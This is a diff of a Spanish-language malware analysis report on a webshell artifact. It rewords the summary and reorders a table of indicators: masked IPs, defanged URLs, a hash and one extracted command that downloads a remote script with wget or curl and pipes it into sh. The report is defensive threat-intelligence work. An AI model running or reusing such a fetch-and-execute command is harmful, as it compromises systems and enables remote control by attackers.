@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se registró 1 detección YARA válida. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. Una detección YARA válida respalda el análisis.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **webshell** con evidencia suficiente para atrib
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:31:17+00:00`
+- **Registrado:** `2026-08-09T19:31:17.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,12 +54,12 @@ Artefacto asociado a la familia **webshell** con evidencia suficiente para atrib
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.164.XXX | static_analysis |
-| ip | 217.60.195.XXX | static_analysis |
 | url | hxxps://217.60.195.XXX/sh | strings |
 | url | hxxps://217.60.195.XXX/sh) | strings |
-| hash | e367cb641cb99ea47a2a3bf99ecd3bef05a42f0bc24c56cc859f60f067ccfb76 | static_analysis |
+| ip | 217.60.195.XXX | static_analysis |
+| ip | 190.179.164.XXX | static_analysis |
 | command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
+| hash | e367cb641cb99ea47a2a3bf99ecd3bef05a42f0bc24c56cc859f60f067ccfb76 | static_analysis |
 | ip | 152.32.205.XXX | artifact_source |
 
 ## 🧬 Detecciones YARA
